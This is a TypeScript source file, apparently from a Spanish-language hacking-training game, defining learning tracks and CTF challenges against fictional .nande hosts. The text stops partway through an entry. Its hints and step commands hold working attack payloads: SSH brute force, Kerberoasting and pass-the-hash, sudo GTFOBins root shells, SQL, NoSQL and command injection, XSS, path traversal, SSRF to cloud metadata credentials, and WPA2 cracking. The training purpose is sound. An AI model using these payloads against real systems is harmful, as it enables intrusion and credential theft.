/**
 * Itinerarios (rutas de aprendizaje) y Retos (CTF) de la Academia ÑANDE.
 *
 * Un itinerario ordena los cursos interactivos en un CAMINO de cero a experto,
 * con prerrequisitos: no es una pila de cursos sueltos, es un viaje. Al terminar
 * la parte de aprendizaje de una ruta se desbloquea su RETO final: un desafío
 * tipo CTF donde el alumno aplica todo capturando una bandera REAL en el mundo.
 *
 * Los retos NO regalan la bandera: se captura de verdad usando las herramientas
 * (terminal/navegador). El tablero sólo marca ✓ cuando la bandera ya está en el
 * historial del jugador (kernel.player.capturedFlags()). Aprender haciendo.
 */

/** Una ruta de aprendizaje: cursos ordenados + un reto final. */
export interface LearningTrack {
  id: string;
  title: string;
  subtitle: string;
  glyph: string;
  hue: number;
  /** Ids de cursos (de Curriculum), en orden pedagógico. */
  courseIds: string[];
  /** Ruta que conviene completar antes (para el candado suave). */
  requires?: string;
  /**
   * Retos que coronan la ruta (de RETOS): usan una técnica que la ruta enseña.
   * Se desbloquean al completar los cursos de la ruta. Puede estar vacío: no
   * toda ruta termina en un reto (los fundamentos y el recon puro no tienen
   * bandera propia).
   */
  finalChallenges?: string[];
}

/** Un reto tipo CTF: escenario + objetivo + bandera real que lo prueba. */
export interface Challenge {
  id: string;
  title: string;
  /** Historia/contexto del desafío. */
  scenario: string;
  /** Qué hay que lograr, en una línea. */
  objective: string;
  /** La bandera ND{...} que demuestra que se logró (debe existir en el mundo). */
  flag: string;
  difficulty: "fácil" | "media" | "difícil";
  /** Pistas escalonadas (de suave a fuerte). */
  hints: string[];
  /** Comandos sugeridos para practicar (se pueden lanzar a la terminal). */
  steps: string[];
  /** App donde se juega: "terminal" (por defecto) o "browser". */
  app?: "terminal" | "browser";
  /** URL a abrir si es un reto de navegador. */
  url?: string;
  /** Curso que enseña la técnica (para "repasar"). */
  courseId?: string;
  reward: { xp: number; coins: number };
}

/* ------------------------------- RETOS -------------------------------- */

export const RETOS: Challenge[] = [
  {
    id: "r-ssh-brute",
    title: "La puerta de atrás",
    scenario:
      "El servidor server.nande tiene SSH (puerto 22) abierto. El soporte técnico dejó una contraseña floja. Entrá antes que un atacante real.",
    objective: "Conseguí usuario y contraseña de SSH por fuerza bruta.",
    flag: "ND{ssh_fuerza_bruta}",
    difficulty: "media",
    hints: [
      "Primero mirá qué puertos tiene abiertos con nmap.",
      "hydra prueba muchas contraseñas por vos. Necesitás un usuario y una lista.",
      "hydra ssh://server.nande  usa las listas por defecto y encuentra la clave.",
    ],
    steps: ["nmap -p- -sV server.nande", "hydra ssh://server.nande"],
    courseId: "c-pass-hydra",
    reward: { xp: 120, coins: 90 },
  },
  {
    id: "r-pivot",
    title: "El corazón de la red",
    scenario:
      "Comprometiste server.nande. Pero lo valioso —la caja interna— vive en una subred que no se ve desde afuera. Usá el server como trampolín: pivoteá a caja.interna.nande y llevate la bandera de root.",
    objective: "Pivotá al host interno y leé /root/flag.txt.",
    flag: "ND{pivoting_red_interna}",
    difficulty: "difícil",
    hints: [
      "Primero necesitás estar dentro de server.nande (foothold): connect server.nande soporte Verano2024.",
      "Desde adentro, la red interna aparece. La nota del server revela caja.interna.nande y su credencial.",
      "connect caja.interna.nande admin GiraSol#2024  y luego  cat /root/flag.txt",
    ],
    steps: [
      "connect server.nande soporte Verano2024",
      "connect caja.interna.nande admin GiraSol#2024",
      "cat /root/flag.txt",
    ],
    courseId: "c-op-killchain",
    reward: { xp: 260, coins: 200 },
  },
  {
    id: "r-ad-dominio",
    title: "De un usuario a dueño del dominio",
    scenario:
      "Tenés un foothold en NANDE.LOCAL como un usuario cualquiera. Una cuenta de servicio (SVC-SQL) expone un SPN: kerberoasteala, crackeá su TGS offline, saltá al servidor que administra y, desde ahí, robá el hash del Domain Admin con mimikatz. Un Pass-the-Hash y el dominio es tuyo.",
    objective: "Comprometé Domain Admins de NANDE.LOCAL (kerberoast → crack → lateral → PtH).",
    flag: "ND{dominio_comprometido}",
    difficulty: "difícil",
    hints: [
      "Enumerá primero: enum4linux NANDE.LOCAL te muestra usuarios, grupos y qué cuenta tiene SPN.",
      "kerberoast SVC-SQL@NANDE.LOCAL te da el TGS; crackealo con crack-tgs y una clave de temporada (Verano2024!).",
      "Ya dueño de SVC-SQL, abusá su AdminTo a DB01 (abuse), volcá credenciales con mimikatz sekurlsa::logonpasswords y hacé Pass-the-Hash del Domain Admin.",
      'mimikatz "sekurlsa::pth /user:ADMIN-SQL@NANDE.LOCAL"  → dominio comprometido.',
    ],
    steps: [
      "enum4linux NANDE.LOCAL",
      "kerberoast SVC-SQL@NANDE.LOCAL",
      "crack-tgs SVC-SQL@NANDE.LOCAL Verano2024!",
      "abuse SVC-SQL@NANDE.LOCAL DB01@NANDE.LOCAL",
      "mimikatz sekurlsa::logonpasswords",
      "mimikatz sekurlsa::pth /user:ADMIN-SQL@NANDE.LOCAL",
    ],
    courseId: "c-ad-directorio",
    reward: { xp: 300, coins: 230 },
  },
  {
    id: "r-lan-nas",
    title: "Los backups son oro",
    scenario:
      "Ya dentro de la LAN interna (server.nande → caja.interna), la nota del admin apunta a otro host del segmento: el NAS de respaldos (nas.interna.nande). Es un par de la misma red 10.10.66.0/24: se alcanza pivotando por el jump host. Entrá y buscá su configuración de backup — suele filtrar credenciales.",
    objective: "Pivotá al NAS interno y leé la config de respaldos world-readable.",
    flag: "ND{nas_backup_expuesto}",
    difficulty: "difícil",
    hints: [
      "Primero foothold en la LAN: connect server.nande soporte Verano2024.",
      "El NAS (10.10.66.20) es par de la caja en el segmento: se llega desde el jump host. connect nas.interna.nande respaldo NasÑande#2024.",
      "La credencial del NAS está en la nota de la caja: connect caja.interna.nande admin GiraSol#2024 y cat /home/admin/red-interna.txt. Ya en el NAS: cat /etc/backup/targets.conf",
    ],
    steps: [
      "connect server.nande soporte Verano2024",
      "connect nas.interna.nande respaldo NasÑande#2024",
      "cat /etc/backup/targets.conf",
    ],
    courseId: "c-op-killchain",
    reward: { xp: 240, coins: 190 },
  },
  {
    id: "r-lan-restringido",
    title: "Dos saltos hasta la joya",
    scenario:
      "El config del NAS filtra el destino de los respaldos: db-core.interna.nande, la base central, en un segmento RESTRINGIDO (10.10.99.0/24) que NO se ve desde la LAN corporativa. Sólo el NAS está puenteado a esa red. Pivotá el segundo salto —desde el NAS— y llevate la bandera de la joya de la corona.",
    objective: "Pivote multi-salto hasta el segmento restringido y leé /root/flag.txt de db-core.",
    flag: "ND{segmento_restringido_ok}",
    difficulty: "difícil",
    hints: [
      "Estando en el NAS, corré 'netmap': aparece el segmento 10.10.99.0/24 que no veías antes.",
      "Las credenciales de db-core están en el config del NAS: cat /etc/backup/targets.conf (dbadmin / Core-DB!2024).",
      "connect db-core.interna.nande dbadmin Core-DB!2024   y luego   cat /root/flag.txt",
    ],
    steps: [
      "connect server.nande soporte Verano2024",
      "connect nas.interna.nande respaldo NasÑande#2024",
      "connect db-core.interna.nande dbadmin Core-DB!2024",
      "cat /root/flag.txt",
    ],
    courseId: "c-op-killchain",
    reward: { xp: 300, coins: 240 },
  },
  {
    id: "r-ot-hmi",
    title: "Del dato a la planta (IT → OT)",
    scenario:
      "db-core es el historian: está doble-homed y puentea la red corporativa con la red industrial (OT). Su uplink filtra el acceso a la consola de operador (HMI) de la planta. Pivotá desde la base central hasta la HMI: es el salto de IT a OT, donde el daño se vuelve físico.",
    objective: "Pivotá IT→OT y tomá la consola HMI (leé su /root/flag.txt).",
    flag: "ND{ot_hmi_tomado}",
    difficulty: "difícil",
    hints: [
      "Llegá primero a db-core (server → nas → db-core) y leé cat /etc/historian/ot-uplink.conf.",
      "El uplink revela la HMI (10.10.77.10) y sus credenciales de operador.",
      "connect hmi.planta.nande operador Planta#2024   y luego   cat /root/flag.txt",
    ],
    steps: [
      "connect server.nande soporte Verano2024",
      "connect nas.interna.nande respaldo NasÑande#2024",
      "connect db-core.interna.nande dbadmin Core-DB!2024",
      "connect hmi.planta.nande operador Planta#2024",
      "cat /root/flag.txt",
    ],
    courseId: "c-op-killchain",
    reward: { xp: 320, coins: 250 },
  },
  {
    id: "r-ot-plc",
    title: "Dueño del proceso físico",
    scenario:
      "La HMI habla con el PLC: el controlador que gobierna bombas y válvulas. Con la config de la HMI conseguís el acceso de ingeniería al PLC. Llegar ahí es controlar la planta — el peor caso de un incidente OT. (Hay más de un camino al PLC: también se lo alcanza desde el historian.)",
    objective: "Alcanzá el PLC de la planta y leé su /root/flag.txt.",
    flag: "ND{ot_plc_control}",
    difficulty: "difícil",
    hints: [
      "Desde la HMI, corré 'netmap': aparece el PLC (10.10.77.20).",
      "La config de la HMI filtra el acceso de ingeniería: cat /etc/scada/plc-links.conf (ingenieria / PlcÑande!2024).",
      "connect plc.planta.nande ingenieria PlcÑande!2024   y luego   cat /root/flag.txt",
    ],
    steps: [
      "connect server.nande soporte Verano2024",
      "connect nas.interna.nande respaldo NasÑande#2024",
      "connect db-core.interna.nande dbadmin Core-DB!2024",
      "connect hmi.planta.nande operador Planta#2024",
      "connect plc.planta.nande ingenieria PlcÑande!2024",
      "cat /root/flag.txt",
    ],
    courseId: "c-op-killchain",
    reward: { xp: 360, coins: 280 },
  },
  {
    id: "r-yvytu-foothold",
    title: "Yvytu Cloud: pie en el runner",
    scenario:
      "deploy.yvytu.nande es el runner de CI/CD de Yvytu, expuesto. El usuario de servicio 'ci' quedó con una clave floja. Entrá y llevate la bandera de usuario.",
    objective: "Conseguí foothold como ci y leé user.txt.",
    flag: "ND{yvytu_foothold}",
    difficulty: "media",
    hints: [
      "Enumerá el host (nmap -sV deploy.yvytu.nande): SSH abierto.",
      "La clave de ci es débil (nombre + año). Adiviná o brute con hydra.",
      "connect deploy.yvytu.nande ci Deploy2024   y luego   cat /home/ci/user.txt",
    ],
    steps: [
      "connect deploy.yvytu.nande ci Deploy2024",
      "cat /home/ci/user.txt",
    ],
    courseId: "c-op-killchain",
    reward: { xp: 130, coins: 100 },
  },
  {
    id: "r-yvytu-root",
    title: "Yvytu Cloud: de ci a root (sudo awk)",
    scenario:
      "Adentro del runner como ci, escalá a root. Le dejaron un sudo NOPASSWD sobre awk (de un script viejo de parseo de logs) — y awk escapa a una shell (GTFOBins). La bandera de root vive en /root, ilegible hasta que escalás.",
    objective: "Escalá a root abusando sudo awk (GTFOBins) y leé /root/flag.txt.",
    flag: "ND{yvytu_root}",
    difficulty: "difícil",
    hints: [
      "sudo -l te dice qué podés correr como root sin clave: awk.",
      "awk puede ejecutar comandos con BEGIN{system(...)}. Como root, eso te da shell de root.",
      "sudo awk 'BEGIN{system(\"/bin/sh\")}'   y luego   cat /root/flag.txt",
    ],
    steps: [
      "connect deploy.yvytu.nande ci Deploy2024",
      "sudo -l",
      "sudo awk 'BEGIN{system(\"/bin/sh\")}'",
      "cat /root/flag.txt",
    ],
    courseId: "c-op-killchain",
    reward: { xp: 230, coins: 180 },
  },
  {
    id: "r-yvytu-exfil",
    title: "Yvytu Cloud: robá los artefactos",
    scenario:
      "Ya root en el runner, el pipeline guarda en /root la credencial del repositorio de artefactos: artefactos.yvytu.nande, en un segmento interno que sólo se alcanza desde el runner. Pivotá y llevate el secreto de producción — el botín de la cadena.",
    objective: "Pivotá al repositorio de artefactos interno y leé su /root/flag.txt.",
    flag: "ND{yvytu_exfil}",
    difficulty: "difícil",
    hints: [
      "Como root en el runner: cat /root/deploy.env revela host y credencial del repo.",
      "El repo (artefactos.yvytu.nande) sólo se ve desde el runner: pivotá desde ahí.",
      "connect artefactos.yvytu.nande deployer Art3f@cts!2024   y luego   cat /root/flag.txt",
    ],
    steps: [
      "connect deploy.yvytu.nande ci Deploy2024",
      "sudo awk 'BEGIN{system(\"/bin/sh\")}'",
      "cat /root/deploy.env",
      "connect artefactos.yvytu.nande deployer Art3f@cts!2024",
      "cat /root/flag.txt",
    ],
    courseId: "c-op-killchain",
    reward: { xp: 320, coins: 250 },
  },
  {
    id: "r-web01-user",
    title: "Pie adentro (foothold)",
    scenario:
      "web01.nande expone SSH y un usuario de sistema (devops) dejó una contraseña floja de temporada. Entrá y llevate la bandera de usuario.",
    objective: "Conseguí acceso como devops y leé user.txt.",
    flag: "ND{foothold_devops}",
    difficulty: "media",
    hints: [
      "Enumerá servicios primero: nmap -sV web01.nande (SSH abierto en el 22).",
      "La clave de devops es débil (nombre + año). Adiviná o brute con hydra.",
      "connect web01.nande devops Delfin2024   y luego   cat /home/devops/user.txt",
    ],
    steps: [
      "connect web01.nande devops Delfin2024",
      "cat /home/devops/user.txt",
    ],
    courseId: "c-op-killchain",
    reward: { xp: 120, coins: 90 },
  },
  {
    id: "r-privesc-sudo",
    title: "De devops a root (sudo GTFOBins)",
    scenario:
      "Ya adentro de web01.nande como devops, escalá a root. Al usuario le dejaron correr un binario como root SIN contraseña (sudo NOPASSWD) para un script viejo — y ese binario escapa a una shell.",
    objective: "Escalá a root abusando sudo (GTFOBins) y leé /root/flag.txt.",
    flag: "ND{privesc_sudo_root}",
    difficulty: "difícil",
    hints: [
      "sudo -l te dice qué podés correr como root sin clave.",
      "find puede ejecutar comandos con -exec. Como root, -exec /bin/sh te da una shell de root.",
      "sudo find . -exec /bin/sh \\;   y luego   cat /root/flag.txt",
    ],
    steps: [
      "connect web01.nande devops Delfin2024",
      "sudo -l",
      "sudo find . -exec /bin/sh \\;",
      "cat /root/flag.txt",
    ],
    courseId: "c-op-killchain",
    reward: { xp: 220, coins: 170 },
  },
  {
    id: "r-sqli-login",
    title: "Sin la llave, igual entro",
    scenario:
      "El banco banco.nande tiene un login mal programado. Entrá al panel sin conocer ninguna contraseña real.",
    objective: "Burlá el login con una inyección SQL.",
    flag: "ND{sqli_login_bypass}",
    difficulty: "media",
    hints: [
      "El usuario que escribís termina dentro de una consulta SQL.",
      "Cerrá la comilla y agregá una condición siempre verdadera, comentando el resto.",
      "Usuario:  admin' OR '1'='1 --   (cualquier contraseña).",
    ],
    steps: ["curl -X POST http://banco.nande/login -d \"usuario=admin' OR '1'='1 --&password=x\""],
    app: "browser",
    url: "http://banco.nande/",
    courseId: "c-web-sqli",
    reward: { xp: 130, coins: 100 },
  },
  {
    id: "r-sqli-dump",
    title: "Robá la base entera",
    scenario:
      "No alcanza con entrar: el listado de movimientos de banco.nande es inyectable. Sacá todos los usuarios y sus contraseñas.",
    objective: "Volcá la tabla de usuarios con UNION SELECT.",
    flag: "ND{sqli_union_dump}",
    difficulty: "difícil",
    hints: [
      "El buscador de /movimientos necesita sesión: primero entrá con el bypass del login.",
      "El buscador arma la consulta con tu texto. Contá las columnas: son 4.",
      "Cerrá la comilla y sumá UNION SELECT id,usuario,password,rol FROM usuarios-- para traer los usuarios.",
      "sqlmap automatiza esto mismo: sqlmap -u \"http://banco.nande/movimientos?q=a\" --dump",
    ],
    steps: [
      "curl -X POST http://banco.nande/login -d \"usuario=admin' -- &password=x\"",
      "curl \"http://banco.nande/movimientos?q=a%' UNION SELECT id,usuario,password,rol FROM usuarios--\"",
    ],
    courseId: "c-web-sqli-union",
    reward: { xp: 180, coins: 140 },
  },
  {
    id: "r-idor",
    title: "El álbum ajeno",
    scenario:
      "En fotos.arandu.nande cada álbum se pide con ?id=. Mirá el álbum privado de otra persona cambiando ese número.",
    objective: "Accedé a un álbum que no es tuyo (IDOR).",
    flag: "ND{idor_album_ajeno}",
    difficulty: "fácil",
    hints: [
      "El id de la URL lo controlás vos.",
      "Probá cambiar ?id=7 por otros números.",
      "curl http://fotos.arandu.nande/album?id=7",
    ],
    steps: ["curl http://fotos.arandu.nande/album?id=7"],
    app: "browser",
    url: "http://fotos.arandu.nande/",
    courseId: "c-web-idor-traversal",
    reward: { xp: 110, coins: 80 },
  },
  {
    id: "r-traversal",
    title: "Escapar de la carpeta",
    scenario:
      "El visor de documentos de docs.tape.nande recibe un nombre de archivo. Escapá de su carpeta y leé un secreto del servidor.",
    objective: "Leé un archivo fuera de la carpeta permitida (path traversal).",
    flag: "ND{path_traversal_secreto}",
    difficulty: "media",
    hints: [
      "../ sube un nivel de carpeta.",
      "Encadená varios ../ para llegar a la raíz y bajar a config.",
      "curl \"http://docs.tape.nande/ver?archivo=../config/secrets.env\"",
    ],
    steps: ["curl \"http://docs.tape.nande/ver?archivo=../config/secrets.env\""],
    courseId: "c-web-idor-traversal",
    reward: { xp: 140, coins: 100 },
  },
  {
    id: "r-cmdi",
    title: "El comando escondido",
    scenario:
      "La herramienta de ping de tools.pyta.nande arma un comando con lo que escribís. Colá tu propio comando.",
    objective: "Ejecutá un comando extra en el servidor (command injection).",
    flag: "ND{cmd_injection_pwned}",
    difficulty: "difícil",
    hints: [
      "El campo 'host' se mete en un comando del sistema.",
      "El ; separa dos comandos en Linux.",
      "curl \"http://tools.pyta.nande/ping?host=x; cat flag\"",
    ],
    steps: ["curl \"http://tools.pyta.nande/ping?host=x; cat flag\""],
    courseId: "c-web-cmdi-jwt",
    reward: { xp: 170, coins: 130 },
  },
  {
    id: "r-jwt",
    title: "El pase falsificado",
    scenario:
      "Una app usa tokens JWT para saber quién sos. Fabricá uno que diga que sos admin.",
    objective: "Forjá un token de administrador (JWT).",
    flag: "ND{jwt_forged_admin}",
    difficulty: "difícil",
    hints: [
      "Un JWT dice tu rol, y a veces se puede reescribir.",
      "La herramienta jwt del sistema arma tokens.",
      "jwt forge nande123 rol=admin usuario=admin",
    ],
    steps: ["jwt forge nande123 rol=admin usuario=admin"],
    courseId: "c-web-cmdi-jwt",
    reward: { xp: 160, coins: 120 },
  },
  {
    id: "r-xss",
    title: "Código en casa ajena",
    scenario:
      "El buscador de blog.yvoty.nande refleja lo que escribís sin limpiarlo. Hacé que ejecute tu script.",
    objective: "Lográ un XSS reflejado.",
    flag: "ND{xss_reflejado}",
    difficulty: "media",
    hints: [
      "Lo que ponés en ?q= aparece tal cual en la página.",
      "Un <script> se ejecuta si no lo escapan.",
      "curl \"http://blog.yvoty.nande/buscar?q=<script>alert(1)</script>\"",
    ],
    steps: ["curl \"http://blog.yvoty.nande/buscar?q=<script>alert(1)</script>\""],
    app: "browser",
    url: "http://blog.yvoty.nande/",
    courseId: "c-web-xss",
    reward: { xp: 130, coins: 100 },
  },
  {
    id: "r-wifi",
    title: "La clave del vecino (con permiso)",
    scenario:
      "En una prueba autorizada, capturá el handshake WPA2 de la red Vecino-2G y recuperá su clave.",
    objective: "Crackeá la clave WPA2 con la cadena de aircrack.",
    flag: "ND{wifi_wpa_crackeada}",
    difficulty: "difícil",
    hints: [
      "Poné la placa en modo monitor y escuchá el canal correcto.",
      "Un deauth fuerza el handshake; grabá con -w.",
      "aircrack-ng -w rockyou.txt captura-01.cap  (después de capturar el handshake).",
    ],
    steps: [
      "airmon-ng start wlan0",
      "airodump-ng --bssid E8:94:F6:77:88:04 -c 6 -w captura wlan0mon",
      "aireplay-ng --deauth 5 -a E8:94:F6:77:88:04 wlan0mon",
      "aircrack-ng -w rockyou.txt captura-01.cap",
    ],
    courseId: "c-wifi-aircrack",
    reward: { xp: 200, coins: 160 },
  },
  {
    id: "r-pmkid",
    title: "Sin cliente, igual caigo (PMKID)",
    scenario:
      "Oficina-5G (WPA2, 5GHz) no tiene ni un cliente conectado, así que el deauth no sirve. Pero filtra el PMKID: robalo directo del AP (clientless) y crackealo con hashcat.",
    objective: "Capturá el PMKID sin cliente y recuperá la clave con hashcat -m 22000.",
    flag: "ND{wifi_pmkid_crackeado}",
    difficulty: "difícil",
    hints: [
      "Sin clientes, el deauth no captura nada: necesitás el ataque clientless de PMKID.",
      "hcxdumptool le pide el PMKID directo al AP (antes: airmon-ng start wlan0).",
      "hashcat -m 22000 pmkid.pcapng -w rockyou.txt Oficina-5G",
    ],
    steps: [
      "airmon-ng start wlan0",
      "hcxdumptool Oficina-5G",
      "hashcat -m 22000 pmkid.pcapng -w rockyou.txt Oficina-5G",
    ],
    courseId: "c-wifi-aircrack",
    reward: { xp: 240, coins: 190 },
  },
  {
    id: "r-crack",
    title: "El hash filtrado",
    scenario:
      "En una brecha se filtró un hash MD5: 2ab96390c7dbe3439de74d0c9b0b1767. Identificá el tipo y recuperá la contraseña con diccionario.",
    objective: "Identificá el hash y crackealo con john o hashcat.",
    flag: "ND{hash_crackeado}",
    difficulty: "media",
    hints: [
      "Primero identificá el tipo: hashid 2ab96390c7dbe3439de74d0c9b0b1767 (32 hex → MD5).",
      "hashcat usa -m 0 para MD5; pasale el diccionario con -w rockyou.txt.",
      "hashcat -m 0 2ab96390c7dbe3439de74d0c9b0b1767 -w rockyou.txt",
    ],
    steps: [
      "hashid 2ab96390c7dbe3439de74d0c9b0b1767",
      "hashcat -m 0 2ab96390c7dbe3439de74d0c9b0b1767 -w rockyou.txt",
    ],
    courseId: "c-pass-hashes",
    reward: { xp: 150, coins: 110 },
  },
  {
    id: "r-siem",
    title: "El defensor contraataca",
    scenario:
      "Del otro lado del ataque: en el SOC (soc.nande) hay que correlacionar los eventos y confirmar la intrusión.",
    objective: "Correlacioná la alerta en el SIEM.",
    flag: "ND{siem_correlacion}",
    difficulty: "media",
    hints: [
      "Un SIEM junta eventos sueltos en una historia.",
      "Buscá por la IP atacante.",
      "curl http://soc.nande/siem?q=10.10.66.13",
    ],
    steps: ["curl http://soc.nande/siem?q=10.10.66.13"],
    courseId: "c-blue-siem",
    reward: { xp: 140, coins: 100 },
  },
  {
    id: "r-dfir",
    title: "Reconstruir la escena",
    scenario:
      "Hubo una intrusión. Como analista forense, armá la línea de tiempo del incidente en soc.nande.",
    objective: "Reconstruí el timeline del ataque (DFIR).",
    flag: "ND{dfir_timeline}",
    difficulty: "difícil",
    hints: [
      "Ordená qué pasó primero y cuál fue la causa.",
      "El primer evento fue la fuerza bruta; la causa, la inyección SQL.",
      "curl \"http://soc.nande/incidente?primero=fuerza+bruta&causa=inyeccion+sql\"",
    ],
    steps: ["curl \"http://soc.nande/incidente?primero=fuerza+bruta&causa=inyeccion+sql\""],
    courseId: "c-blue-dfir",
    reward: { xp: 170, coins: 130 },
  },
  {
    id: "r-onion",
    title: "Detrás del circuito",
    scenario:
      "Hay un servicio oculto .onion que sólo se alcanza con el circuito de anonimato encendido. Llegá sin dejar rastro.",
    objective: "Alcanzá un servicio oculto con el circuito activo.",
    flag: "ND{onion_alcanzada_con_circuito}",
    difficulty: "difícil",
    hints: [
      "Primero encendé el anonimato.",
      "Los .onion no se resuelven por DNS normal.",
      "anon on && onion biblioteca7k2fx.onion",
    ],
    steps: ["anon on && onion biblioteca7k2fx.onion"],
    courseId: "c-opsec-anon",
    reward: { xp: 160, coins: 120 },
  },
  {
    id: "r-ssrf-metadata",
    title: "La nube filtrada",
    scenario:
      "preview.vortex.nande 'previsualiza' cualquier URL que le pidas: la petición la hace el SERVIDOR, no tu navegador. Eso alcanza lugares internos que vos no ves. El más goloso en la nube: el servicio de metadata en 169.254.169.254, que guarda las credenciales IAM de la instancia.",
    objective: "Usá el SSRF para leer la metadata de la nube y robá la credencial IAM.",
    flag: "ND{ssrf_metadata_robada}",
    difficulty: "difícil",
    hints: [
      "El previsualizador hace el pedido por vos: pedile una URL interna.",
      "La IP mágica de la metadata en AWS/Azure es 169.254.169.254.",
      "curl \"http://preview.vortex.nande/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/rol-admin\"",
    ],
    steps: [
      "curl \"http://preview.vortex.nande/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/rol-admin\"",
    ],
    app: "browser",
    url: "http://preview.vortex.nande/",
    courseId: "c-webmod-ssrf",
    reward: { xp: 220, coins: 170 },
  },
  {
    id: "r-ssrf-interno",
    title: "El panel de solo-localhost",
    scenario:
      "El mismo previsualizador de Vortex también alcanza servicios que escuchan solo en localhost del servidor: un panel de administración interno que jamás debería verse desde afuera. Pedíselo por SSRF.",
    objective: "Llegá por SSRF al panel interno que solo escucha en localhost.",
    flag: "ND{ssrf_interno}",
    difficulty: "media",
    hints: [
      "Los servicios 'solo-localhost' escuchan en 127.0.0.1.",
      "El servidor SÍ alcanza su propio localhost: pedíselo vía el previsualizador.",
      "curl \"http://preview.vortex.nande/fetch?url=http://127.0.0.1/admin\"",
    ],
    steps: [
      "curl \"http://preview.vortex.nande/fetch?url=http://127.0.0.1/admin\"",
    ],
    app: "browser",
    url: "http://preview.vortex.nande/",
    courseId: "c-webmod-ssrf",
    reward: { xp: 180, coins: 140 },
  },
  {
    id: "r-open-redirect",
    title: "El enlace traicionero",
    scenario:
      "link.gulu.nande es un acortador: te manda a la URL de ?next= sin validar el destino. Un enlace que arranca en gulu.nande (de confianza) pero termina en un sitio del atacante es la base de un phishing convincente. Demostralo.",
    objective: "Abusá del open redirect para que un enlace de gulu.nande lleve a un sitio externo.",
    flag: "ND{open_redirect}",
    difficulty: "fácil",
    hints: [
      "El destino lo controlás vos en el parámetro ?next=.",
      "Si el destino es EXTERNO (otro dominio), se demuestra el phishing.",
      "curl \"http://link.gulu.nande/go?next=http://robo-cuentas.ejemplo.test/login\"",
    ],
    steps: [
      "curl \"http://link.gulu.nande/go?next=http://robo-cuentas.ejemplo.test/login\"",
    ],
    app: "browser",
    url: "http://link.gulu.nande/",
    courseId: "c-webmod-redirect",
    reward: { xp: 120, coins: 90 },
  },
  {
    id: "r-container-escape",
    title: "Salir de la caja",
    scenario:
      "En el cluster corre un pod de depuración (debug-tools) que quedó PRIVILEGIADO y con el filesystem del nodo montado adentro. Eso es una puerta directa al host: escapá del contenedor y leé la bandera del nodo.",
    objective: "Escapá del contenedor privilegiado al host y leé el archivo del nodo.",
    flag: "ND{container_escape_privilegiado}",
    difficulty: "difícil",
    hints: [
      "Listá los pods y mirá cuál es ⚠privileged: nandec ps.",
      "Inspeccioná sus montajes: nandec inspect debug-tools (monta / del host).",
      "nandec escape debug-tools",
    ],
    steps: [
      "nandec inspect debug-tools",
      "nandec escape debug-tools",
    ],
    courseId: "c-cloud-escape",
    reward: { xp: 300, coins: 240 },
  },
  {
    id: "r-k8s-secret",
    title: "El secreto en el entorno",
    scenario:
      "Un pod de API (api-backend) dejó un secreto en una variable de entorno, como pasa en la vida real. Caíste en el cluster: volcá su env y llevate la credencial expuesta.",
    objective: "Volcá el entorno del pod api-backend y capturá el secreto filtrado.",
    flag: "ND{k8s_secret_en_env}",
    difficulty: "media",
    hints: [
      "Listá los pods: nandec ps.",
      "Los secretos en env se leen ejecutando dentro del pod.",
      "nandec exec api-backend env",
    ],
    steps: [
      "nandec ps",
      "nandec exec api-backend env",
    ],
    courseId: "c-cloud-secretos",
    reward: { xp: 200, coins: 160 },
  },
  {
    id: "r-lfi",
    title: "El archivo que no debía leerse",
    scenario:
      "Portal Nova arma sus páginas incluyendo un archivo por su nombre (?pg=inicio), sin confinarlo. Salí de la carpeta de vistas y hacé que incluya su config con secretos.",
    objective: "Explotá el LFI para leer la config del servidor (config/secretos.env).",
    flag: "ND{lfi_config_incluida}",
    difficulty: "media",
    hints: [
      "El parámetro ?pg= elige qué archivo se incluye, y no está confinado.",
      "Con ../ salís de la carpeta de vistas hacia otros archivos.",
      "curl \"http://portal.nova.nande/?pg=../config/secretos.env\"",
    ],
    steps: ["curl \"http://portal.nova.nande/?pg=../config/secretos.env\""],
    app: "browser",
    url: "http://portal.nova.nande/",
    courseId: "c-webadv-lfi",
    reward: { xp: 180, coins: 140 },
  },
  {
    id: "r-ssti",
    title: "El saludo que ejecuta",
    scenario:
      "Codeá Saludos arma el saludo metiendo tu nombre DENTRO de la plantilla del servidor. Lo que pongas entre {{ }} se evalúa. Llegá al contexto del servidor y robá su secreto.",
    objective: "Explotá el SSTI para exponer el contexto del servidor.",
    flag: "ND{ssti_contexto_expuesto}",
    difficulty: "difícil",
    hints: [
      "Probá primero {{7*7}}: si devuelve 49, tu entrada se evalúa.",
      "El contexto del servidor se alcanza con una expresión como {{config}}.",
      "curl \"http://saludos.codea.nande/?nombre={{config}}\"",
    ],
    steps: ["curl \"http://saludos.codea.nande/?nombre={{config}}\""],
    app: "browser",
    url: "http://saludos.codea.nande/",
    courseId: "c-webadv-ssti-nosql",
    reward: { xp: 220, coins: 170 },
  },
  {
    id: "r-nosql",
    title: "Login sin contraseña (NoSQL)",
    scenario:
      "El login de Redix arma una consulta tipo Mongo con lo que mandás. Si la contraseña es un operador en vez de un texto, matchea cualquier clave. Entrá como admin sin saberla.",
    objective: "Burlá el login con una inyección NoSQL (operador $ne).",
    flag: "ND{nosql_auth_bypass}",
    difficulty: "difícil",
    hints: [
      "La contraseña se parsea como objeto si empieza con {.",
      "Un operador {\"$ne\":null} matchea cualquier valor.",
      "curl \"http://login.redix.nande/entrar?usuario=admin&password=%7B%22%24ne%22%3Anull%7D\"",
    ],
    steps: ["curl \"http://login.redix.nande/entrar?usuario=admin&password=%7B%22%24ne%22%3Anull%7D\""],
    app: "browser",
    url: "http://login.redix.nande/",
    courseId: "c-webadv-ssti-nosql",
    reward: { xp: 200, coins: 160 },
  },
  {
    id: "r-deserial",
    title: "La sesión falsificada",
    scenario:
      "Redix Sesiones guarda tu sesión como un objeto serializado (base64 de JSON) y confía en lo que vuelve. Falsificá una sesión de admin y entrá al panel.",
    objective: "Explotá la deserialización insegura para volverte admin.",
    flag: "ND{deserializacion_insegura}",
    difficulty: "media",
    hints: [
      "base64 no es cifrado: se decodifica, se edita y se re-codifica.",
      "Armá {\"rol\":\"admin\"} en base64 y mandalo en ?sesion=.",
      "curl \"http://cuenta.redix.nande/?sesion=eyJyb2wiOiJhZG1pbiIsInVzdWFyaW8iOiJoYWNrZXIifQ==\"",
    ],
    steps: ["curl \"http://cuenta.redix.nande/?sesion=eyJyb2wiOiJhZG1pbiIsInVzdWFyaW8iOiJoYWNrZXIifQ==\""],
    app: "browser",
    url: "http://cuenta.redix.nande/",
    courseId: "c-webadv-confianza",
    reward: { xp: 180, coins: 140 },
  },
  {
    id: "r-upload",
